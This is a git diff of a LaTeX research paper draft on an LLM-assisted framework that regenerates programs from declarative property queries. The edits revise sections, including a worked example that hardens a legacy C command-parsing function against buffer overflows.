+Third, the underlying synthesis technology---particularly LLMs---is evolving rapidly; a declarative interface can harness this progress without disrupting the framework's end user.
 
@@
 of change: any property extractor becomes, effectively, a transformation oracle. 
-The result is an extensible ecosystem where existing analyses not only tell us 
-what is wrong or suboptimal, but also allow us to automatically create 
-semantics-preserving, property-optimized alternatives.
-
-\heading{Deployment scenarios}
-\sys supports a range of deployment scenarios.
-It is particularly well-suited for use during maintenance and auditing phases, where developers seek to refactor or replace components, especially when the original code is difficult to understand, modify, or is unavailable and the component exists only as a binary.
-It can also assist during development, for instance when integrating
-third-party modules that must be adapted to local conventions or hardened
-against security vulnerabilities.
-% For example, a developer can regenerate a C library as idiomatic
-% JavaScript while preserving input-output equivalence, or decompose a monolithic function
-% into modular components suitable for sandboxing.
-% However, \sys is not designed for whole-program synthesis or large-scale migrations.
-% Its strength lies in scoped regeneration tasks, typically at the granularity of a function, method, or small module---where transformation goals can be explicitly stated and verified in isolation.
-% To this end, \sys can function not only as a standalone tool but also as a
-% library, where other components can invoke it as a programmable,
-% constraint-guided regeneration module.
+This is not all, as 
+its also possible to morph the extracted properties,
+treating them as intermediate representations, thus further increasing 
+the transformation space.
+% The result is an extensible ecosystem where existing analyses not only tell us 
+% what is wrong or suboptimal, but also allow us to automatically create 
+% semantics-preserving, property-optimized alternatives.
 
@@
 
-\heading{Availability}
-The \sys early-stage prototype in available as an open-source MIT-licensed artifact at:
-\begin{center}
-  \url{https://github.com/blinded}
-\end{center}
+% \heading{Availability}
+% The \sys early-stage prototype in available as an open-source MIT-licensed artifact at:
+% \begin{center}
+%   \url{https://github.com/blinded}
+% \end{center}
 
@@
 sketched in \cref{fig:ex-large-app}.
-A single codebase includes many needs for transformations.
-For example, a developer going through older parts of the codebase written by 
-a previous team might realize that many functions are susceptible to buffer-overflow attacks.
-Then, thinking about a recently incorporated JavaScript scripting component 
-that allows players to make custom extensions to key parts of client-side game logic, 
-suggests that perhaps code that deals with user input should all be moved inside 
-the sandboxed runtime.
+This single codebase encompasses different transformation needs.
+For example, a developer going through older parts of the codebase 
+might realize that many functions that accept user-controlled data are susceptible to buffer-overflow attacks.
+Later, reflecting on the recently added JavaScript scripting component used for player-made extensions, it becomes clear
+that these functions might be better moved entirely into the sandboxed runtime.
 Furthermore, the development team would like to identify functions that could 
@@
 \heading{The state of the art and practise}
-Currently, a developer has access to a myriad of different approaches 
+Right now, a developer has access to a myriad of different approaches 
 to attack the above problems, but all come with shortcomings.
@@
 As the programming-language landscape is becoming increasingly diverse,
-and developers are building systems where multiple different languages are runtimes coexist,
-these limitations cannot be ignored.
+and multiple different languages are runtimes coexist in a single system,
+these limitations are becoming hard to ignore.
+But even by detecting improvement opportunities, it still falls on the development team to implement them.
 Program synthesis could be an attractive avenue that allows 
-the developer to 
-The ever-present limitation of traditional program synthesis techniques~\cite{jha2010oracle, raza2018disjunctive, singh2016blinkfill,wu2023programming, harp:ccs:2021, yaghmazadeh2018automated} is their
-inability to scale beyond narrowly-defined computational domains.
-This scalability barrier is what statistical techniques like LLMs 
-have promised to solve.
-An LLM could in principle be tasked with performing all the aforementioned transformations.
+the developer to overcome the language barrier by synthesizing a new implementation that fits the refined specification.
+However, the ever-present limitation of traditional program synthesis techniques~\cite{jha2010oracle, raza2018disjunctive, singh2016blinkfill,wu2023programming, harp:ccs:2021, yaghmazadeh2018automated} is their
+difficulty to scale beyond narrowly-defined computational domains.
+Statistical techniques like LLMs show promise in addressing this scalability barrier.
 However, they come with no shortage of well-studied shortcomings~(\cref{sec:intro}).
-There have been systems that provide ranging amounts of control of LLM-generated 
+An LLM could in principle be tasked with performing all the aforementioned transformations, and
+there have been systems that provide ranging amounts of control of LLM-generated 
 programs~\cite{huang2023anplnaturalprogramminginteractive,li2025mccoderstreamliningmotioncontrol,barua2025pygencollaborativehumanaiapproach, tihanyi2025new},
@@
   \caption{\textbf{Applying \sys to a complex game application.}
-  The high level of modularity present in modern applications allows \sys to be applied effectively inside a codebase.
-  In the above graph, edges signify logical dependencies between components 
+  % The high level of modularity present in modern applications allows \sys to be applied effectively inside a codebase.
+  In the graph, edges signify logical dependencies between components 
   and shaded vertices signify parts of the codebase \sys is applied to~(\cref{sec:example}).
-  Dotted edges signify omitted layers of dependencies.
+  Dotted edges signify omitted layers or dependencies.
   }
@@
 
-This example is used to highlight the
-diversity of transformation goals that arise even within a single codebase:
+Consider the game application outlined in \cref{fig:ex-large-app}.
+A diversity of transformation goals arise even within a single codebase:
 security hardening, cross-language migration, modernization of unsafe idioms,
@@
 \heading{A legacy input handling function}
-Zooming into the \ttt{cmd.c} file of the game codebase, 
-which handles parsing and executing user commands provided by an in-game console.
+Let's zoom into the \ttt{cmd.c} file of the game codebase,
+which handles parsing and executing user commands provided by an in-game console~(\cref{lst:ex-parse}).
 This functionality is used by developers to test and debug the game, but also during regular gameplay
-by game administrators or players where they can customize the game by spawning objects, changing game settings, \etc.
-Such code is often notoriously difficult to write,
+by game administrators or players so they can customize the game by spawning objects, changing game settings, \etc
+This kind of string-handling code is often notoriously difficult to write,
 and there have been many instances of buffer overflow vulnerabilities being introduced because of it~\cite{CVE-2006-3400, CVE-2006-3401, CVE-2007-5248, CVE-2019-1010043}.
@@
 \caption{A string formatting function that concatenates command-line arguments into a single string.}
+  \label{lst:ex-parse}
 \end{listing}
@@
 graph(p_,I,O):-graph(p,I,O),
-               crash(p,I).
+               { crash(p,I); }.
 :-crash(p_,I),graph(p_,I,_).
@@
 \end{wrapfigure}
-To the right is a program written in the \sys DSL to express this intent.
-This query requires the regenerated program \ttt{P\_} to exhibit the same
-input-output behavior on representative inputs that would cause a buffer overflow in the original program \ttt{P}
-but not on the regenerated program \ttt{P\_}.
-\sys first arrives the set of properties to extract from the
-original program, given the query:
-\{\prop{input(P, I)}, \prop{graph(P, I, O)}, \prop{fsignt(P, S)}\}, where
-\prop{input(P, I)} means that \sys will use extract a set of inputs from the original program
-by prompting an LLM with the program's source code and asking it to generate a set of inputs that
-would cause a buffer overflow in the original program;
+The developer wants to regenerate this function to eliminate this class of vulnuerabilities.
+Some realizations: because the function is pure, its behavior can be fully described by input–output examples; moreover, if a buffer overflow exists, there must be inputs that trigger it.
+To the right is a query written in the \sys DSL that hardens the function 
+against malicious inputs.
+This query requires the regenerated program \ttt{p\_} to exhibit the same
+input-output behavior on both representative inputs, but have non-faulty behavior on inputs that will cause a segmentation fault to the original program \ttt{p}.
+\sys first arrives at the set of properties to extract from the
+original program, given the query (capital \ttt{P} here matching both the original and regenerated program):
+\{\prop{graph(P, I, O)}, \prop{fsignt(P, S)}\}, where
 \prop{graph(P, I, O)} extracts the client-observable input-output behavior of the program
-by executing the original program on the generated inputs and recording the outputs;
+by executing the original program on the LLM-generated inputs and recording the outputs;
+\prop{crash(p, I)} signals the input generator to provide segmentation fault inducing inputs, 
+and filters those that actually do;
 and \prop{fsignt(P, S)} extracts each function's signature using a language-aware parser.
@@
 representation between C and JavaScript, the query invokes the \ttt{tr} plugin
-to convert each input and output into equivalent forms suitable for the target language.
+to convert each input and output into an equivalen one in the target language.
+Behind-the-scenes a fine-tuned LLM will perform this translation.
 \sys first determines the minimal set of properties to extract from the
@@
 idiomaticity. \sys regenerates the program, minimizing this metric while
-preserving observable behavior over a representative set of inputs which will be generated by an LLM instance.
+preserving observable behavior over a set of inputs which will be generated by an LLM instance.
 \begin{wrapfigure}[2]{r}{.6\columnwidth}
@@
 with the entire codebase being 605 lines-of-code.
-
-\heading{A benchmark suite for program regeneration}
-For research on program regeneration to flourish, it needs a common benchmark
-suite that captures the diversity and difficulty of real-world transformations.
-Today, there is no equivalent of SPEC for performance or Defects4J for bug
-fixing---researchers and practitioners rely on ad hoc examples that are hard to compare and often
-oversimplified.
-This lack of a shared baseline obscures progress. 
-A useful set of benchmarks should include
-programs that
-(1) are real and non-trivial,
-(2) are written in a variety of languages, 
-(3) cover a wide range of computational domains.
-Each benchmark should include an original program, 
-the same program that undergoes the transformation described in natural-language 
-in an accompanying file, and a set of tests that verify that the transformation was successful.
-Following the lead of benchmarking efforts~\cite{SPEC_CPU2017, dacapo2006, koala:atc:2025}, the suite should be made open-source, community 
-first, and an established technical steering committee should guide extensions and modifications towards maintaining the suite's relevance.
 
@@
 
+\heading{Deployment scenarios}
+\sys supports a range of deployment scenarios.
+It is particularly well-suited for use during maintenance and auditing phases, where developers seek to refactor or replace components, especially when the original code is difficult to understand, modify, or is unavailable and the component exists only as a binary.
+It can also assist during development, for instance when integrating
+third-party modules that must be adapted to local conventions or hardened
+against security vulnerabilities.
+% For example, a developer can regenerate a C library as idiomatic
+% JavaScript while preserving input-output equivalence, or decompose a monolithic function
+% into modular components suitable for sandboxing.
+% However, \sys is not designed for whole-program synthesis or large-scale migrations.
+% Its strength lies in scoped regeneration tasks, typically at the granularity of a function, method, or small module---where transformation goals can be explicitly stated and verified in isolation.
+% To this end, \sys can function not only as a standalone tool but also as a
+% library, where other components can invoke it as a programmable,
+% constraint-guided regeneration module.
+
 \heading{Language-specific support}
@@
 supports Python, JavaScript, Haskell, and C.
+
+\heading{A benchmark suite for program regeneration} % TODO: Fix this
+For research on program regeneration to flourish, it needs a common benchmark
+suite that captures the diversity and difficulty of real-world transformations.
+Today, there is no equivalent of SPEC for performance or Defects4J for bug
+fixing---researchers and practitioners rely on ad hoc examples that are hard to compare and often
+oversimplified.
+This lack of a shared baseline obscures progress. 
+A useful set of benchmarks should include
+programs that
+(1) are real and non-trivial,
+(2) are written in a variety of languages, 
+(3) cover a wide range of computational domains.
+Each benchmark should include an original program, 
+the same program that undergoes the transformation described in natural-language 
+in an accompanying file, and a set of tests that verify that the transformation was successful.
+Following the lead of benchmarking efforts~\cite{SPEC_CPU2017, dacapo2006, koala:atc:2025}, the suite should be made open-source, community 
+first, and an established technical steering committee should guide extensions and modifications towards maintaining the suite's relevance.
 

### 2025-08-07 docs/paper/draft.tex
Final thesis
Signed-off-by: Evangelos Lamprou <vagos@lamprou.xyz>

@@
-\documentclass[nonacm,sigplan,review]{acmart}
+\documentclass[nonacm,sigplan]{acmart}
 
@@
 future lies in harnessing their generative power within a framework that retains
-correctness, explainability, and developer control as first-class citizens.
+correctness, and developer control as first-class citizens.
 
